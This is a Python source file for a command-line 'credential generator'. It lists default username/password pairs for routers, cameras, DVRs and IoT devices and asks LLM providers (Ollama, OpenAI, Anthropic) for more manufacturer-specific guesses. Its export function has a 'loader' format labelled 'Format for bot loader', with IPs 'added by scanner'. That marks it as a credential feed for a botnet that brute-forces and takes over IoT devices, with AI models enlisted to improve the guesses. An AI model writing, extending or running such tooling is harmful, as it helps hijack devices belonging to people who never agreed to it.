#!/usr/bin/env python3
"""
Enhanced Credential Generator with Full LLM Integration

Combines pattern-based generation with LLM intelligence for
superior credential prediction.
"""

import argparse
import json
import sys
import os
from typing import List, Dict, Optional  # noqa: F401
from dataclasses import dataclass

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    from llm_integration.llm_client import LLMClient, LLMConfig, LLMProvider
    LLM_AVAILABLE = True
except ImportError:
    LLM_AVAILABLE = False
    print("⚠️  LLM integration not available, using pattern-based fallback")


@dataclass


class Credential:
    username: str
    password: str
    source: str = "pattern"
    confidence: float = 0.5


class EnhancedCredentialGenerator:
    """
    Advanced credential generator combining:
    - Pattern-based generation (fast, offline)
    - LLM-based generation (intelligent, adaptive)
    - Historical success tracking
    """

    def __init__(self, use_llm: bool = True, llm_provider: str = "ollama"):
        self.use_llm = use_llm and LLM_AVAILABLE
        self.llm_client = None

        if self.use_llm:
            self._init_llm(llm_provider)

        # Pattern-based defaults (always available)
        self.common_patterns = self._load_patterns()

    def _init_llm(self, provider: str):
        """Initialize LLM client"""
        try:
            if provider == "ollama":
                config = LLMConfig(
                    provider=LLMProvider.OLLAMA,
                    model="llama2"
                )
            elif provider == "openai":
                config = LLMConfig(
                    provider=LLMProvider.OPENAI,
                    api_key=os.getenv('OPENAI_API_KEY'),
                    model="gpt-3.5-turbo"
                )
            elif provider == "anthropic":
                config = LLMConfig(
                    provider=LLMProvider.ANTHROPIC,
                    api_key=os.getenv('ANTHROPIC_API_KEY'),
                    model="claude-3-sonnet-20240229"
                )
            else:
                raise ValueError(f"Unknown provider: {provider}")

            self.llm_client = LLMClient(config)
            print(f"✅ LLM initialized: {provider}")
        except Exception as e:
            print(f"⚠️  Failed to initialize LLM: {e}")
            self.use_llm = False

    def _load_patterns(self) -> Dict[str, List[tuple]]:
        """Load pattern-based credential database"""
        return {
            "router": [
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "1234"),
                ("root", "root"),
                ("admin", ""),
                ("", "admin"),
            ],
            "camera": [
                ("admin", "12345"),
                ("admin", "admin"),
                ("root", "12345"),
                ("admin", ""),
                ("888888", "888888"),
            ],
            "dvr": [
                ("admin", ""),
                ("admin", "12345"),
                ("admin", "admin"),
                ("root", "root"),
                ("admin", "password"),
            ],
            "iot": [
                ("admin", "admin"),
                ("root", "root"),
                ("user", "user"),
                ("admin", ""),
                ("default", "default"),
            ]
        }

    def generate_hybrid(self, device_type: str, count: int = 20) -> List[Credential]:
        """
        Generate credentials using hybrid approach:
        1. Start with pattern-based (guaranteed to work)
        2. Enhance with LLM if available (intelligent additions)
        3. Return combined, deduplicated list
        """
        credentials = []

        # Phase 1: Pattern-based (fast, offline)
        pattern_creds = self._generate_pattern_based(device_type, count // 2)
        credentials.extend(pattern_creds)
        print(f"✅ Generated {len(pattern_creds)} pattern-based credentials")

        # Phase 2: LLM-based (intelligent, adaptive)
        if self.use_llm and self.llm_client:
            try:
                llm_creds = self._generate_llm_based(device_type, count // 2)
                credentials.extend(llm_creds)
                print(f"✅ Generated {len(llm_creds)} LLM-based credentials")
            except Exception as e:
                print(f"⚠️  LLM generation failed: {e}, using patterns only")

        # Deduplicate
        seen = set()
        unique_creds = []
        for cred in credentials:
            key = (cred.username, cred.password)
            if key not in seen:
                seen.add(key)
                unique_creds.append(cred)

        return unique_creds[:count]

    def _generate_pattern_based(self, device_type: str, count: int) -> List[Credential]:
        """Fast pattern-based generation"""
        device_type = device_type.lower()
        patterns = self.common_patterns.get(device_type, self.common_patterns["iot"])

        credentials = []
        for username, password in patterns[:count]:
            credentials.append(Credential(
                username=username,
                password=password,
                source="pattern",
                confidence=0.7
            ))

        return credentials

    def _generate_llm_based(self, device_type: str, count: int) -> List[Credential]:
        """Intelligent LLM-based generation"""
        if not self.llm_client:
            return []

        # Use LLM client's credential generation
        llm_results = self.llm_client.generate_credentials(device_type, count)

        credentials = []
        for cred_str in llm_results:
            # Parse "username:password" format
            if ':' in cred_str:
                username, password = cred_str.split(':', 1)
                credentials.append(Credential(
                    username=username,
                    password=password,
                    source="llm",
                    confidence=0.8
                ))

        return credentials

    def generate_manufacturer_specific(self, manufacturer: str, model: str = "") -> List[Credential]:
        """Generate manufacturer-specific credentials"""
        if self.use_llm and self.llm_client:
            prompt = f"manufacturer:{manufacturer}"
            if model:
                prompt += f",model:{model}"

            try:
                results = self.llm_client.generate_credentials(prompt, count=10)
                credentials = []
                for cred_str in results:
                    if ':' in cred_str:
                        username, password = cred_str.split(':', 1)
                        credentials.append(Credential(
                            username=username,
                            password=password,
                            source=f"llm-{manufacturer}",
                            confidence=0.85
                        ))
                return credentials
            except Exception as e:
                print(f"⚠️  Manufacturer-specific generation failed: {e}")

        # Fallback to patterns
        return self._generate_pattern_based("iot", 10)

    def export_to_file(self, credentials: List[Credential], filename: str, format: str = "json"):
        """Export credentials to file"""
        if format == "json":
            with open(filename, 'w') as f:
                json.dump([
                    {
                        "username": c.username,
                        "password": c.password,
                        "source": c.source,
                        "confidence": c.confidence
                    }
                    for c in credentials
                ], f, indent=2)
        elif format == "text":
            with open(filename, 'w') as f:
                for c in credentials:
                    f.write(f"{c.username}:{c.password}\n")
        elif format == "loader":
            # Format for bot loader
            with open(filename, 'w') as f:
                for c in credentials:
                    # Format: ip:port user:pass (will have IP added by scanner)
                    f.write(f"{c.username}:{c.password}\n")

        print(f"✅ Exported {len(credentials)} credentials to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="Enhanced Credential Generator with LLM Integration"
    )
    parser.add_argument("device_type", help="Device type (router, camera, dvr, iot)")
    parser.add_argument("-c", "--count", type=int, default=20, help="Number of credentials")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-f", "--format", choices=["json", "text", "loader"], default="json")
    parser.add_argument("--no-llm", action="store_true", help="Disable LLM, use patterns only")
    parser.add_argument("--provider", choices=["ollama", "openai", "anthropic"], default="ollama")
    parser.add_argument("--manufacturer", help="Specific manufacturer")
    parser.add_argument("--model", help="Device model")

    args = parser.parse_args()

    # Initialize generator
    generator = EnhancedCredentialGenerator(
        use_llm=not args.no_llm,
        llm_provider=args.provider
    )

    # Generate credentials
    if args.manufacturer:
        credentials = generator.generate_manufacturer_specific(args.manufacturer, args.model or "")
    else:
        credentials = generator.generate_hybrid(args.device_type, args.count)

    # Display results
    print(f"\n{'='*60}")
    print(f"Generated {len(credentials)} credentials for: {args.device_type}")
    print(f"{'='*60}\n")

    for i, cred in enumerate(credentials[:10], 1):  # Show first 10
        print(f"{i:2}. {cred.username:15} : {cred.password:15} [{cred.source}, {cred.confidence:.2f}]")

    if len(credentials) > 10:
        print(f"... and {len(credentials) - 10} more")

    # Export if requested
    if args.output:
        generator.export_to_file(credentials, args.output, args.format)

    print(f"\n✅ Complete!")  # noqa: F541


if __name__ == "__main__":
    main()
